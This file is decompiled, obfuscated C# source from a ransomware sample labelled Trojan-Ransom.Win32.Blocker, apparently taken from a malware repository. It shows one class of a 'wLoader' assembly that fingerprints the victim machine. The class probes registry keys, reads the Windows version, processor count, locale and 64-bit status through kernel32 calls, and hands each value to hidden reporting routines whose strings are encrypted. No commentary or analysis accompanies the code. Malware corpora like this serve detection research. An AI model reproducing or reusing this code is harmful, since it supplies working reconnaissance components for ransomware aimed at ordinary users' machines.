// Decompiled with JetBrains decompiler
// Type: ?36?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89823795-D5B3-4CC9-949D-6649607AF138
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bndr-d893b556a8d0493f8839c80049bd91fd0bdbcb93646edcc7b2f28d89325ced11.exe

using Microsoft.Win32;
using System;
using System.Globalization;
using System.Runtime.InteropServices;

internal static class \u003F36\u003F
{
  public static void \u003F0\u003F()
  {
    try
    {
      int num;
      if (\u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1244)))
      {
        \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1249));
        num = 0;
      }
      else
        goto label_3;
label_2:
      int major;
      int minor1;
      int minor2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
          case 2:
          case 3:
            goto label_11;
          case 4:
            switch (major)
            {
              case 5:
                minor1 = Environment.OSVersion.Version.Minor;
                num = 5;
                continue;
              case 6:
                minor2 = Environment.OSVersion.Version.Minor;
                num = 9;
                continue;
              default:
                goto label_23;
            }
          case 5:
            switch (minor1)
            {
              case 0:
                \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1502));
                num = 6;
                continue;
              case 1:
                \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1535));
                num = 7;
                continue;
              case 2:
                \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1564));
                num = 8;
                continue;
              default:
                goto label_23;
            }
          case 6:
          case 7:
          case 8:
          case 10:
          case 11:
label_23:
            \u003F36\u003F.\u003F5\u003F();
            num = 12;
            continue;
          case 9:
            switch (minor2)
            {
              case 0:
                \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1597));
                num = 10;
                continue;
              case 1:
                \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1638));
                num = 11;
                continue;
              case 2:
                \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1675));
                goto label_23;
              default:
                goto label_23;
            }
          case 12:
            \u003F36\u003F.\u003F9\u003F();
            num = 13;
            continue;
          case 13:
            \u003F36\u003F.\u003F11\u003F();
            num = 14;
            continue;
          default:
            goto label_26;
        }
      }
label_26:
      return;
label_3:
      if (\u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1290)))
      {
        \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1299));
        num = 1;
        goto label_2;
      }
      else if (\u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1340)))
      {
        \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1349));
        num = 2;
        goto label_2;
      }
      else if (\u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1390)))
      {
        \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1407));
        num = 3;
        goto label_2;
      }
      else if (\u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1448)))
        \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1461));
label_11:
      major = Environment.OSVersion.Version.Major;
      num = 4;
      goto label_2;
    }
    catch
    {
    }
  }

  public static void \u003F5\u003F()
  {
    try
    {
      \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1704) + (object) Environment.ProcessorCount);
    }
    catch
    {
    }
  }

  public static void \u003F9\u003F()
  {
    try
    {
      \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1733) + CultureInfo.CurrentCulture.Name);
    }
    catch
    {
    }
  }

  public static void \u003F11\u003F()
  {
    try
    {
      \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1766) + (object) (\u003F36\u003F.\u003F0\u003F() ? 64 : 32));
    }
    catch
    {
    }
  }

  private static bool \u003F0\u003F()
  {
    if (IntPtr.Size == 8)
      return true;
    bool flag;
    return \u003F36\u003F.\u003F0\u003F(\u003F20\u003F.\u003F53\u003F(1795), \u003F20\u003F.\u003F53\u003F(1812)) && \u003F36\u003F.\u003F0\u003F(\u003F36\u003F.\u003F0\u003F(), out flag) && flag;
  }

  private static bool \u003F0\u003F(string _param0, string _param1)
  {
    IntPtr num = \u003F36\u003F.\u003F0\u003F(_param0);
    return !(num == IntPtr.Zero) && \u003F36\u003F.\u003F0\u003F(num, _param1) != IntPtr.Zero;
  }

  [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
  private static extern IntPtr \u003F0\u003F();

  [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", CharSet = CharSet.Auto)]
  private static extern IntPtr \u003F0\u003F(string _param0);

  [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr \u003F0\u003F(IntPtr _param0, [MarshalAs(UnmanagedType.LPStr)] string _param1);

  [DllImport("kernel32.dll", EntryPoint = "IsWow64Process", CharSet = CharSet.Auto, SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool \u003F0\u003F(IntPtr _param0, out bool _param1);

  private static bool \u003F0\u003F(string _param0)
  {
    RegistryKey registryKey = (RegistryKey) null;
    try
    {
      registryKey = Registry.LocalMachine.OpenSubKey(\u003F20\u003F.\u003F53\u003F(1833) + _param0) ?? Registry.LocalMachine.OpenSubKey(\u003F20\u003F.\u003F53\u003F(1894) + _param0);
      return registryKey != null;
    }
    finally
    {
      registryKey?.Close();
    }
  }

  public static void \u003F0\u003F([\u003F38\u003F] string _param0) => \u003F46\u003F.\u003F0\u003F(_param0);
}
